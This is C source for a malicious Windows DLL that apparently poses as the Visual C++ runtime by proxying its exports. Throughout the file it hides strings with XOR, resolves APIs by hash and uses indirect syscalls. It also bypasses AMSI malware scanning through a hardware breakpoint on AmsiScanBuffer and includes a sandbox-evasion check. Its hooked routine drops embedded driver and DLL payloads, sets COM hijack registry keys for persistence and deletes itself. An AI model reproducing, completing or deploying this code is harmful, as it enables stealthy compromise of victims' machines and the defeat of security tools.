#include <windows.h>
#include "indirect.h"
#include "resolve.h"
#include "cff.h"

void ___chkstk_ms(void) { return; }

void *memset(void *dest, int val, size_t count) {
  unsigned char *p = (unsigned char *)dest;
  while (count--)
    *p++ = (unsigned char)val;
  return dest;
}

void *memcpy(void *dest, const void *src, size_t count) {
  unsigned char *d = (unsigned char *)dest;
  const unsigned char *s = (const unsigned char *)src;
  while (count--)
    *d++ = *s++;
  return dest;
}

void *memmove(void *dest, const void *src, size_t count) {
  unsigned char *d = (unsigned char *)dest;
  const unsigned char *s = (const unsigned char *)src;
  if (d < s) {
    while (count--)
      *d++ = *s++;
  } else if (d > s) {
    d += count;
    s += count;
    while (count--)
      *(--d) = *(--s);
  }
  return dest;
}

void *memchr(const void *ptr, int val, size_t count) {
  const unsigned char *p = (const unsigned char *)ptr;
  while (count--) {
    if (*p == (unsigned char)val)
      return (void *)p;
    p++;
  }
  return (void *)0;
}

int memcmp(const void *s1, const void *s2, size_t count) {
  const unsigned char *a = (const unsigned char *)s1;
  const unsigned char *b = (const unsigned char *)s2;
  while (count--) {
    if (*a != *b)
      return *a - *b;
    a++;
    b++;
  }
  return 0;
}

int strcmp(const char *s1, const char *s2) {
  while (*s1 && (*s1 == *s2)) {
    s1++;
    s2++;
  }
  return *(const unsigned char *)s1 - *(const unsigned char *)s2;
}

static int triggered = 0;

static unsigned char ck2[] = "9832gf2bc29_120e9hd10c))b@@!11";
static unsigned int ck2l = 30;

void dc_xd(unsigned char *enc, char *out, int len) {
  int i;
  for (i = 0; i < len; i++)
    out[i] = enc[i] ^ ck2[i % ck2l];
  out[len] = 0;
}

static void xe(char *plain, unsigned char *enc, int len) {
  int i;
  for (i = 0; i < len; i++)
    enc[i] = plain[i] ^ ck2[i % ck2l];
  memset(plain, 0, len);
}

void dc_xb(unsigned char *enc, unsigned char *out, int len,
               int abs_offset) {
  int i;
  for (i = 0; i < len; i++)
    out[i] = enc[i] ^ ck2[(abs_offset + i) % ck2l];
}

static HMODULE rl(unsigned char *enc, int len) {
  char buf[64] = {0};
  dc_xd(enc, buf, len);
  HMODULE mod = LoadLibraryA(buf);
  xe(buf, enc, len);
  return mod;
}

static FARPROC ra(HMODULE mod, unsigned char *enc, int len) {
  char buf[64] = {0};
  dc_xd(enc, buf, len);
  FARPROC fn = GetProcAddress(mod, buf);
  xe(buf, enc, len);
  return fn;
}

static int slen(const char *s) {
  int i = 0;
  while (s[i])
    i++;
  return i;
}

size_t strlen(const char *s) { return (size_t)slen(s); }

typedef DWORD(WINAPI *pExpandEnvironmentStringsA)(LPCSTR, LPSTR, DWORD);

static int asc_to_w(const char *s, WCHAR *w, int wcap) {
  int i = 0;

  while (s[i] && i < wcap - 1) {
    w[i] = (WCHAR)(unsigned char)s[i];
    i++;
  }
  w[i] = 0;
  return i;
}

__attribute__((noinline, optimize("O0")))
static void reg_install(const char *subkey, const char *dll_path) {
  unsigned char e_advapi32[] = {0x58, 0x5c, 0x45, 0x53, 0x17, 0x0f, 0x01,
                                0x50, 0x4d, 0x56, 0x55, 0x33};
  typedef LSTATUS(WINAPI *pRegCreateKeyExA)(HKEY, LPCSTR, DWORD, LPSTR, DWORD,
                                            REGSAM, LPSECURITY_ATTRIBUTES,
                                            PHKEY, LPDWORD);
  typedef LSTATUS(WINAPI *pRegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD,
                                          const BYTE *, DWORD);
  typedef LSTATUS(WINAPI *pRegCloseKey)(HKEY);
  HMODULE hAdv;
  HKEY hKey;
  HKEY hkcu = (HKEY)(ULONG_PTR)(LONG)0x80000001;
  WCHAR wdll[512];
  static const WCHAR wtm[] = L"ThreadingModel";
  static const WCHAR wapt[] = L"Apartment";
  pRegCreateKeyExA fRegCreateKeyExA = NULL;
  pRegSetValueExW fRegSetValueExW = NULL;
  pRegCloseKey fRegCloseKey = NULL;
  API_SLOT adv_slots[3];
  int plen;
  DWORD cbDllW;

  if (!subkey || !subkey[0] || !dll_path || !dll_path[0])
    return;

  hAdv = rl(e_advapi32, 12);
  if (!hAdv)
    return;

  adv_slots[0].hash = HASH_RegCreateKeyExA;
  adv_slots[0].out = (void **)&fRegCreateKeyExA;
  adv_slots[1].hash = HASH_RegSetValueExW;
  adv_slots[1].out = (void **)&fRegSetValueExW;
  adv_slots[2].hash = HASH_RegCloseKey;
  adv_slots[2].out = (void **)&fRegCloseKey;
  if (!resolve_api_batch(hAdv, adv_slots, 3))
    return;

  if (fRegCreateKeyExA(hkcu, subkey, 0, NULL, 0, 0x00020006, NULL, &hKey,
                       NULL) != ERROR_SUCCESS)
    return;

  plen = asc_to_w(dll_path, wdll, 512);
  cbDllW = (DWORD)((plen + 1) * sizeof(WCHAR));

  if (fRegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE *)wdll, cbDllW) !=
      ERROR_SUCCESS)
    (void)fRegSetValueExW(hKey, L"", 0, REG_SZ, (const BYTE *)wdll, cbDllW);
  (void)fRegSetValueExW(hKey, wtm, 0, REG_SZ, (const BYTE *)wapt, sizeof(wapt));

  fRegCloseKey(hKey);
}

__attribute__((noinline))
static int pop_quiz(void) {
  volatile ULONG64 x = 0xA5A5A5A5A5A5A5A5ULL;
  volatile ULONG64 y = 0x5A5A5A5A5A5A5A5AULL;
  volatile DWORD c = 0;
  int i;

  for (i = 0; i < 8; i++) {
    x ^= (x << 13);
    x ^= (x >> 7);
    x ^= (x << 17);
    y = (y * 6364136223846793005ULL) + x;
    c ^= (DWORD)(x & 0xFFFFFFFFULL);
  }

  if (((x ^ y) & 0xFFFFULL) == 0xBEEFULL) {
    volatile DWORD acc = 0;
    for (i = 0; i < 2000; i++)
      acc += (DWORD)((i * 31) ^ (i << 2));
    return 1;
  }

  return 0;
}

void dc_path_expand(char *path, int cap, cff_expand_fn fExpand) {
  char tmp[512];
  DWORD n;

  if (!fExpand || !path || cap < 2)
    return;
  n = fExpand(path, tmp, (DWORD)sizeof(tmp));
  if (n == 0 || n > (DWORD)sizeof(tmp))
    return;
  if (n > (DWORD)cap)
    n = (DWORD)cap;
  memcpy(path, tmp, n);
  path[n - 1] = 0;
}

static void *g_bp_tgt;
static int g_veh_reg;

typedef LONG(WINAPI *pAddVectoredExceptionHandler)(ULONG,
                                                   PVECTORED_EXCEPTION_HANDLER);
typedef BOOL(WINAPI *pGetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL(WINAPI *pSetThreadContext)(HANDLE, const CONTEXT *);
typedef HANDLE(WINAPI *pGetCurrentThread)(void);
typedef HMODULE(WINAPI *pGetModuleHandleA)(LPCSTR);

static LONG WINAPI bp_veh(PEXCEPTION_POINTERS ex) {
  PCONTEXT ctx;
  DWORD_PTR *rsp;
  DWORD *res;

  if (!g_bp_tgt || !ex || !ex->ExceptionRecord || !ex->ContextRecord)
    return EXCEPTION_CONTINUE_SEARCH;
  if (ex->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
    return EXCEPTION_CONTINUE_SEARCH;

  ctx = ex->ContextRecord;
  if ((void *)(ULONG_PTR)ctx->Rip != g_bp_tgt)
    return EXCEPTION_CONTINUE_SEARCH;

  rsp = (DWORD_PTR *)(ULONG_PTR)ctx->Rsp;
  res = *(DWORD **)(rsp + 6);
  if (res)
    *res = 0;
  ctx->Rax = 0;
  ctx->Rip = *rsp;
  ctx->Rsp += 8;
  ctx->Dr6 = 0;
  ctx->EFlags |= 0x10000;
  return EXCEPTION_CONTINUE_EXECUTION;
}

static HMODULE get_k32(void) {
  HMODULE h = mod_from_peb(HASH_kernel32_dll);
  if (h)
    return h;
  {
    unsigned char e_k32[] = {0x52, 0x5d, 0x41, 0x5c, 0x02, 0x0a, 0x01,
                             0x50, 0x4d, 0x56, 0x55, 0x33, 0x31};
    return rl(e_k32, 13);
  }
}

#ifdef _WIN64
static HMODULE get_ntdll(void) {
  HMODULE h = mod_from_peb(HASH_ntdll_dll);
  if (h)
    return h;
  {
    unsigned char e_nt[] = {0x57, 0x4c, 0x57, 0x5e, 0x0b,
                            0x48, 0x56, 0x0e, 0x0f};
    return rl(e_nt, 9);
  }
}
#endif

static void bp_arm(void) {
  unsigned char e_amsi[] = {0x58, 0x55, 0x40, 0x5b, 0x49, 0x02, 0x5e, 0x0e};

  HMODULE hK32;
  HMODULE hAmsi;
  void *fn;
  CONTEXT ctx;
  HANDLE hThread;
  pGetModuleHandleA fGetModuleHandleA = NULL;
  pAddVectoredExceptionHandler fAddVectoredExceptionHandler = NULL;
  pGetThreadContext fGetThreadContext = NULL;
  pSetThreadContext fSetThreadContext = NULL;
  pGetCurrentThread fGetCurrentThread = NULL;
  API_SLOT k32_slots[5];

  hK32 = get_k32();
  if (!hK32)
    return;

  k32_slots[0].hash = HASH_GetModuleHandleA;
  k32_slots[0].out = (void **)&fGetModuleHandleA;
  k32_slots[1].hash = HASH_AddVectoredExceptionHandler;
  k32_slots[1].out = (void **)&fAddVectoredExceptionHandler;
  k32_slots[2].hash = HASH_GetThreadContext;
  k32_slots[2].out = (void **)&fGetThreadContext;
  k32_slots[3].hash = HASH_SetThreadContext;
  k32_slots[3].out = (void **)&fSetThreadContext;
  k32_slots[4].hash = HASH_GetCurrentThread;
  k32_slots[4].out = (void **)&fGetCurrentThread;
  if (!resolve_api_batch(hK32, k32_slots, 5))
    return;

  if (!fGetModuleHandleA || !fAddVectoredExceptionHandler ||
      !fGetThreadContext || !fSetThreadContext || !fGetCurrentThread)
    return;

  {
    char amsi_buf[16];
    dc_xd(e_amsi, amsi_buf, 8);
    hAmsi = fGetModuleHandleA(amsi_buf);
    xe(amsi_buf, e_amsi, 8);
  }
  if (!hAmsi)
    hAmsi = rl(e_amsi, 8);
  if (!hAmsi)
    return;

  if (!g_bp_tgt) {
    fn = resolve_by_hash(hAmsi, HASH_AmsiScanBuffer);
    if (!fn)
      return;
    g_bp_tgt = fn;
  }

  if (!g_veh_reg) {
    if (!fAddVectoredExceptionHandler(1, bp_veh))
      return;
    g_veh_reg = 1;
  }

  fn = g_bp_tgt;
  memset(&ctx, 0, sizeof(ctx));
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
  hThread = fGetCurrentThread();
  if (!fGetThreadContext(hThread, &ctx))
    return;

  ctx.Dr0 = (DWORD_PTR)fn;
  ctx.Dr7 = 0x00000001;
  (void)fSetThreadContext(hThread, &ctx);
}

#include "data.h"

void *_set_se_translator(void *translator) {
  if (triggered)
    return (void *)0;
  triggered = 1;

  bp_arm();

  if (pop_quiz()) {
      return (void *)0;
  }

  HMODULE hK32 = get_k32();
  if (!hK32)
    return (void *)0;

  typedef BOOL(WINAPI * pCreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
  typedef HANDLE(WINAPI * pCreateFileA)(
      LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
  typedef BOOL(WINAPI * pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD,
                                    LPOVERLAPPED);
  typedef BOOL(WINAPI * pCloseHandle)(HANDLE);
  typedef BOOL(WINAPI * pMoveFileExA)(LPCSTR, LPCSTR, DWORD);
  typedef DWORD(WINAPI * pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
  typedef SIZE_T(WINAPI * pVirtualQuery)(LPCVOID, PMEMORY_BASIC_INFORMATION,
                                         SIZE_T);
  typedef VOID(WINAPI * pGetSystemTime)(LPSYSTEMTIME);
  typedef int(WINAPI * pGetTimeFormatA)(LCID, DWORD, const SYSTEMTIME *, LPCSTR,
                                        LPSTR, int);

  pCreateDirectoryA fCreateDirectoryA = NULL;
  pCreateFileA fCreateFileA = NULL;
  pWriteFile fWriteFile = NULL;
  pCloseHandle fCloseHandle = NULL;
  pMoveFileExA fMoveFileExA = NULL;
  pGetModuleFileNameA fGetModuleFileNameA = NULL;
  pVirtualQuery fVirtualQuery = NULL;
  pExpandEnvironmentStringsA fExpandEnvironmentStringsA = NULL;
  pGetSystemTime fGetSystemTime = NULL;
  pGetTimeFormatA fGetTimeFormatA = NULL;
  API_SLOT k32_core[5];
  API_SLOT k32_fallback[5];
  int use_indirect = 0;

#ifdef _WIN64
  {
    HMODULE hNtdll = get_ntdll();
    if (hNtdll)
      use_indirect = indirect_init(hNtdll);
  }
#endif

  k32_core[0].hash = HASH_ExpandEnvironmentStringsA;
  k32_core[0].out = (void **)&fExpandEnvironmentStringsA;
  k32_core[1].hash = HASH_GetModuleFileNameA;
  k32_core[1].out = (void **)&fGetModuleFileNameA;
  k32_core[2].hash = HASH_MoveFileExA;
  k32_core[2].out = (void **)&fMoveFileExA;
  k32_core[3].hash = HASH_GetSystemTime;
  k32_core[3].out = (void **)&fGetSystemTime;
  k32_core[4].hash = HASH_GetTimeFormatA;
  k32_core[4].out = (void **)&fGetTimeFormatA;
  if (!resolve_api_batch(hK32, k32_core, 5))
    return (void *)0;

  if (!use_indirect) {
    k32_fallback[0].hash = HASH_CreateDirectoryA;
    k32_fallback[0].out = (void **)&fCreateDirectoryA;
    k32_fallback[1].hash = HASH_CreateFileA;
    k32_fallback[1].out = (void **)&fCreateFileA;
    k32_fallback[2].hash = HASH_WriteFile;
    k32_fallback[2].out = (void **)&fWriteFile;
    k32_fallback[3].hash = HASH_CloseHandle;
    k32_fallback[3].out = (void **)&fCloseHandle;
    k32_fallback[4].hash = HASH_VirtualQuery;
    k32_fallback[4].out = (void **)&fVirtualQuery;
    if (!resolve_api_batch(hK32, k32_fallback, 5))
      return (void *)0;
  }

  unsigned char e_dir1[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54};
  unsigned char e_dir2[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22, 0x7b, 0x64};
  unsigned char e_dir3[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22, 0x7b, 0x64, 0x3e, 0x12, 0x25, 0x40, 0x55, 0x54, 0x4b, 0x67, 0x01, 0x04, 0x49, 0x56, 0x02, 0x53, 0x4d, 0x00, 0x08, 0x6a, 0x07, 0x01};
  unsigned char e_sys_dir[] = {
      0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e,
      0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22, 0x7b, 0x64,
      0x3e, 0x12, 0x25, 0x40, 0x55, 0x54, 0x4b, 0x67, 0x01, 0x04, 0x49, 0x56,
      0x02, 0x53, 0x4d, 0x00, 0x08, 0x6a, 0x07, 0x01, 0x6c, 0x21, 0x56, 0x1f,
      0x0a, 0x5d, 0x5f, 0x02, 0x4d, 0x5a};
  char sys_dir[256];
  CFF_ENC sys_dirs[4];
  CFF_IO cff_io;
  volatile ULONG64 cff_acc;

  cff_io.use_indirect = use_indirect;
  cff_io.expand = (cff_expand_fn)fExpandEnvironmentStringsA;
  cff_io.mkdir = (cff_mkdir_fn)fCreateDirectoryA;
  cff_io.create = (cff_create_fn)fCreateFileA;
  cff_io.write = (cff_write_fn)fWriteFile;
  cff_io.close = (cff_close_fn)fCloseHandle;
  cff_acc = (ULONG64)(ULONG_PTR)fExpandEnvironmentStringsA ^ 0xC0FFEEULL;

  sys_dirs[0].enc = e_dir1;
  sys_dirs[0].len = 20;
  sys_dirs[1].enc = e_dir2;
  sys_dirs[1].len = 24;
  sys_dirs[2].enc = e_dir3;
  sys_dirs[2].len = 44;
  sys_dirs[3].enc = e_sys_dir;
  sys_dirs[3].len = 54;
  cff_sys_dirs(sys_dirs, 4, sys_dir, (int)sizeof(sys_dir), &cff_io, &cff_acc);

  unsigned char e_sys_path[] = {
      0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e,
      0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22, 0x7b, 0x64,
      0x3e, 0x12, 0x25, 0x40, 0x55, 0x54, 0x4b, 0x67, 0x01, 0x04, 0x49, 0x56,
      0x02, 0x53, 0x4d, 0x00, 0x08, 0x6a, 0x07, 0x01, 0x6c, 0x21, 0x56, 0x1f,
      0x0a, 0x5d, 0x5f, 0x02, 0x4d, 0x5a, 0x3e, 0x01, 0x27, 0x44, 0x5f, 0x55,
      0x58, 0x67, 0x02, 0x07, 0x4a, 0x57, 0x0b, 0x3d, 0x55, 0x1f, 0x0b, 0x6f,
      0x03, 0x04, 0x1e, 0x15, 0x57, 0x0f};
  char sys_path[256];
  dc_xd(e_sys_path, sys_path, 78);
  dc_path_expand(sys_path, (int)sizeof(sys_path),
                 (cff_expand_fn)fExpandEnvironmentStringsA);
  cff_write_payload(sys_path, file_sys, file_sys_len, &cff_io, &cff_acc);

  unsigned char e_dll_dir1[] = {0x1c, 0x74, 0x7c, 0x71, 0x26, 0x2a, 0x73, 0x32, 0x33, 0x76, 0x78, 0x0b, 0x70, 0x17, 0x6c, 0x28, 0x50, 0x0b, 0x16, 0x5e, 0x43, 0x0c, 0x4f, 0x5d, 0x3e, 0x17, 0x29, 0x4f, 0x55, 0x5e, 0x4e, 0x4b};
  unsigned char e_dll_dir2[] = {0x1c, 0x74, 0x7c, 0x71, 0x26, 0x2a, 0x73, 0x32, 0x33, 0x76, 0x78, 0x0b, 0x70, 0x17, 0x6c, 0x28, 0x50, 0x0b, 0x16, 0x5e, 0x43, 0x0c, 0x4f, 0x5d, 0x3e, 0x17, 0x29, 0x4f, 0x55, 0x5e, 0x4e, 0x4b, 0x6f, 0x71, 0x0b, 0x09, 0x47, 0x06, 0x30, 0x46, 0x56, 0x2d, 0x54};
  unsigned char e_dll_dir3[] = {0x1c, 0x74, 0x7c, 0x71, 0x26, 0x2a, 0x73, 0x32, 0x33, 0x76, 0x78, 0x0b, 0x70, 0x17, 0x6c, 0x28, 0x50, 0x0b, 0x16, 0x5e, 0x43, 0x0c, 0x4f, 0x5d, 0x3e, 0x17, 0x29, 0x4f, 0x55, 0x5e, 0x4e, 0x4b, 0x6f, 0x71, 0x0b, 0x09, 0x47, 0x06, 0x30, 0x46, 0x56, 0x2d, 0x54, 0x6e, 0x63, 0x0d, 0x5c, 0x04, 0x08};
  CFF_ENC dll_dirs[3];

  dll_dirs[0].enc = e_dll_dir1;
  dll_dirs[0].len = 32;
  dll_dirs[1].enc = e_dll_dir2;
  dll_dirs[1].len = 43;
  dll_dirs[2].enc = e_dll_dir3;
  dll_dirs[2].len = 49;
  cff_dll_dirs(dll_dirs, 3, sys_dir, (int)sizeof(sys_dir), &cff_io, &cff_acc);

  #define DLL_PATH_LEN 85
  unsigned char e_dll_path[] = {
        0x1c, 0x74, 0x7c, 0x71, 0x26, 0x2a, 0x73, 0x32, 0x33, 0x76, 0x78,
        0x0b, 0x70, 0x17, 0x6c, 0x28, 0x50, 0x0b, 0x16, 0x5e, 0x43, 0x0c,
        0x4f, 0x5d, 0x3e, 0x17, 0x29, 0x4f, 0x55, 0x5e, 0x4e, 0x4b, 0x6f,
        0x71, 0x0b, 0x09, 0x47, 0x06, 0x30, 0x46, 0x56, 0x2d, 0x54, 0x6e,
        0x63, 0x0d, 0x5c, 0x04, 0x08, 0x6d, 0x67, 0x0a, 0x47, 0x4d, 0x0d,
        0x37, 0x33, 0x0f, 0x72, 0x5d, 0x56, 0x4d, 0x57, 0x61, 0x13, 0x09,
        0x40, 0x07, 0x4d, 0x61, 0x5a, 0x37, 0x54, 0x5f, 0x51, 0x4b, 0x6a,
        0x00, 0x01, 0x5d, 0x5c, 0x4d, 0x4d, 0x45, 0x0e
  };
  char dll_path[512];
  memset(dll_path, 0, sizeof(dll_path));
  dc_xd(e_dll_path, dll_path, DLL_PATH_LEN);
  dc_path_expand(dll_path, (int)sizeof(dll_path),
                 (cff_expand_fn)fExpandEnvironmentStringsA);

  unsigned char e_reg_key[] = {
      0x6a, 0x57, 0x55, 0x46, 0x10, 0x07, 0x40, 0x07, 0x3f, 0x71, 0x55,
      0x3e, 0x42, 0x41, 0x55, 0x16, 0x65, 0x2b, 0x28, 0x62, 0x79, 0x27,
      0x75, 0x52, 0x57, 0x70, 0x03, 0x64, 0x06, 0x04, 0x7b, 0x7b, 0x1e,
      0x05, 0x51, 0x50, 0x71, 0x4f, 0x57, 0x03, 0x0a, 0x69, 0x1c, 0x70,
      0x76, 0x50, 0x7c, 0x45, 0x5d, 0x00, 0x09, 0x54, 0x68, 0x68, 0x50,
      0x73, 0x75, 0x17, 0x08, 0x74, 0x44, 0x64, 0x7a, 0x5c, 0x37, 0x14,
      0x5d, 0x01, 0x30, 0x57, 0x4b, 0x29, 0x54, 0x40, 0x03, 0x57, 0x39
  };
  char reg_key[256];

  memset(reg_key, 0, sizeof(reg_key));
  dc_xd(e_reg_key, reg_key, 76);
  reg_install(reg_key, dll_path);

  cff_write_payload(dll_path, file_dll, file_dll_len, &cff_io, &cff_acc);

  SYSTEMTIME st;
  fGetSystemTime(&st);
  char timeBuf[128];
  fGetTimeFormatA(LOCALE_USER_DEFAULT, 0, &st, NULL, timeBuf, 128);

  MEMORY_BASIC_INFORMATION mbi;
  HMODULE hModule = NULL;
  if (use_indirect) {
    if (io_virtual_query(_set_se_translator, &mbi, sizeof(mbi)) != 0)
      hModule = (HMODULE)mbi.AllocationBase;
  } else if (fVirtualQuery(_set_se_translator, &mbi, sizeof(mbi)) != 0) {
    hModule = (HMODULE)mbi.AllocationBase;
  }

  if (hModule != NULL) {
    char module_path[MAX_PATH];
    if (fGetModuleFileNameA(hModule, module_path, MAX_PATH) > 0) {
      fMoveFileExA(module_path, NULL, 0x4);
    }
  }

  return (void *)0;
}

void *p___C_specific_handler;
EXCEPTION_DISPOSITION __attribute__((naked))
__C_specific_handler(struct _EXCEPTION_RECORD *ExceptionRecord,
                     void *EstablisherFrame, struct _CONTEXT *ContextRecord,
                     struct _DISPATCHER_CONTEXT *DispatcherContext) {
  asm("jmp *p___C_specific_handler(%rip)");
}

void *p___current_exception;
void __attribute__((naked)) __current_exception() {
  asm("jmp *p___current_exception(%rip)");
}

void *p___current_exception_context;
void __attribute__((naked)) __current_exception_context() {
  asm("jmp *p___current_exception_context(%rip)");
}

void *p___CxxFrameHandler3;
void __attribute__((naked)) __CxxFrameHandler3() {
  asm("jmp *p___CxxFrameHandler3(%rip)");
}

void *p___std_exception_copy;
void __attribute__((naked)) __std_exception_copy() {
  asm("jmp *p___std_exception_copy(%rip)");
}

void *p___std_exception_destroy;
void __attribute__((naked)) __std_exception_destroy() {
  asm("jmp *p___std_exception_destroy(%rip)");
}

void *p__CxxThrowException;
void __attribute__((naked)) _CxxThrowException() {
  asm("jmp *p__CxxThrowException(%rip)");
}

void *p___uncaught_exceptions;
void __attribute__((naked)) __uncaught_exceptions() {
  asm("jmp *p___uncaught_exceptions(%rip)");
}

void *p___uncaught_exception;
void __attribute__((naked)) __uncaught_exception() {
  asm("jmp *p___uncaught_exception(%rip)");
}

void *p___std_terminate;
void __attribute__((naked)) __std_terminate() {
  asm("jmp *p___std_terminate(%rip)");
}

void *p__purecall;
void __attribute__((naked)) _purecall() { asm("jmp *p__purecall(%rip)"); }

void *p___AdjustPointer;
void __attribute__((naked)) __AdjustPointer() {
  asm("jmp *p___AdjustPointer(%rip)");
}

void *p___std_type_info_destroy_list;
void __attribute__((naked)) __std_type_info_destroy_list() {
  asm("jmp *p___std_type_info_destroy_list(%rip)");
}

void *p___processing_throw;
void __attribute__((naked)) __processing_throw() {
  asm("jmp *p___processing_throw(%rip)");
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    bp_arm();

    unsigned char e_sys_vc[] = {
        0x7a, 0x02, 0x6f, 0x65, 0x0e, 0x08, 0x56, 0x0d, 0x14, 0x41, 0x65, 0x0c,
        0x48, 0x41, 0x44, 0x00, 0x54, 0x5b, 0x56, 0x6d, 0x46, 0x00, 0x5b, 0x5c,
        0x0c, 0x34, 0x29, 0x4c, 0x54, 0x00, 0x0d, 0x08, 0x1d, 0x56, 0x0b, 0x0a};
    char sys_vc[64];
    dc_xd(e_sys_vc, sys_vc, 36);

    HMODULE hReal = LoadLibraryA(sys_vc);
    if (hReal) {
      unsigned char e___C_specific_handler[] = {
          0x66, 0x67, 0x70, 0x6d, 0x14, 0x16, 0x57, 0x01, 0x0a, 0x54,
          0x50, 0x3c, 0x6e, 0x5a, 0x51, 0x0b, 0x5d, 0x04, 0x01, 0x43}; // 20
      p___C_specific_handler = ra(hReal, e___C_specific_handler, 20);

      unsigned char e___current_exception[] = {
          0x66, 0x67, 0x50, 0x47, 0x15, 0x14, 0x57, 0x0c, 0x17, 0x6d,
          0x5c, 0x27, 0x52, 0x57, 0x40, 0x11, 0x50, 0x07, 0x0a}; // 19
      p___current_exception = ra(hReal, e___current_exception, 19);

      unsigned char e___current_exception_context[] = {
          0x66, 0x67, 0x50, 0x47, 0x15, 0x14, 0x57, 0x0c, 0x17,
          0x6d, 0x5c, 0x27, 0x52, 0x57, 0x40, 0x11, 0x50, 0x07,
          0x0a, 0x6e, 0x53, 0x0c, 0x47, 0x5d, 0x07, 0x38, 0x34}; // 27
      p___current_exception_context =
          ra(hReal, e___current_exception_context, 27);

      unsigned char e___CxxFrameHandler3[] = {
          0x66, 0x67, 0x70, 0x4a, 0x1f, 0x20, 0x40, 0x03, 0x0e,
          0x57, 0x71, 0x3e, 0x5f, 0x56, 0x5c, 0x00, 0x4b, 0x5b}; // 18
      p___CxxFrameHandler3 = ra(hReal, e___CxxFrameHandler3, 18);

      unsigned char e___std_exception_copy[] = {
          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x57, 0x1a, 0x00, 0x57,
          0x49, 0x2b, 0x58, 0x5d, 0x5e, 0x3a, 0x5a, 0x07, 0x14, 0x48}; // 20
      p___std_exception_copy = ra(hReal, e___std_exception_copy, 20);

      unsigned char e___std_exception_destroy[] = {
          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x57, 0x1a,
          0x00, 0x57, 0x49, 0x2b, 0x58, 0x5d, 0x5e, 0x3a,
          0x5d, 0x0d, 0x17, 0x45, 0x42, 0x0c, 0x50}; // 23
      p___std_exception_destroy = ra(hReal, e___std_exception_destroy, 23);

      unsigned char e__CxxThrowException[] = {
          0x66, 0x7b, 0x4b, 0x4a, 0x33, 0x0e, 0x40, 0x0d, 0x14,
          0x77, 0x41, 0x3c, 0x54, 0x42, 0x44, 0x0c, 0x56, 0x06}; // 18
      p__CxxThrowException = ra(hReal, e__CxxThrowException, 18);

      unsigned char e___uncaught_exceptions[] = {
          0x66, 0x67, 0x46, 0x5c, 0x04, 0x07, 0x47, 0x05, 0x0b, 0x46, 0x66,
          0x3a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f, 0x43}; // 21
      p___uncaught_exceptions = ra(hReal, e___uncaught_exceptions, 21);

      unsigned char e___uncaught_exception[] = {
          0x66, 0x67, 0x46, 0x5c, 0x04, 0x07, 0x47, 0x05, 0x0b, 0x46,
          0x66, 0x3a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f}; // 20
      p___uncaught_exception = ra(hReal, e___uncaught_exception, 20);

      unsigned char e___std_terminate[] = {0x66, 0x67, 0x40, 0x46, 0x03,
                                           0x39, 0x46, 0x07, 0x11, 0x5f,
                                           0x50, 0x31, 0x50, 0x46, 0x55}; // 15
      p___std_terminate = ra(hReal, e___std_terminate, 15);

      unsigned char e__purecall[] = {0x66, 0x48, 0x46, 0x40, 0x02,
                                     0x05, 0x53, 0x0e, 0x0f}; // 9
      p__purecall = ra(hReal, e__purecall, 9);

      unsigned char e___AdjustPointer[] = {0x66, 0x67, 0x72, 0x56, 0x0d,
                                           0x13, 0x41, 0x16, 0x33, 0x5d,
                                           0x50, 0x31, 0x45, 0x57, 0x42}; // 15
      p___AdjustPointer = ra(hReal, e___AdjustPointer, 15);

      unsigned char e___std_type_info_destroy_list[] = {
          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x46, 0x1b, 0x13, 0x57,
          0x66, 0x36, 0x5f, 0x54, 0x5f, 0x3a, 0x5d, 0x0d, 0x17, 0x45,
          0x42, 0x0c, 0x50, 0x76, 0x0e, 0x29, 0x33, 0x55}; // 28
      p___std_type_info_destroy_list =
          ra(hReal, e___std_type_info_destroy_list, 28);

      unsigned char e___processing_throw[] = {
          0x66, 0x67, 0x43, 0x40, 0x08, 0x05, 0x57, 0x11, 0x10,
          0x5b, 0x57, 0x38, 0x6e, 0x46, 0x58, 0x17, 0x56, 0x1f}; // 18
      p___processing_throw = ra(hReal, e___processing_throw, 18);
    }
  }
  return TRUE;
}
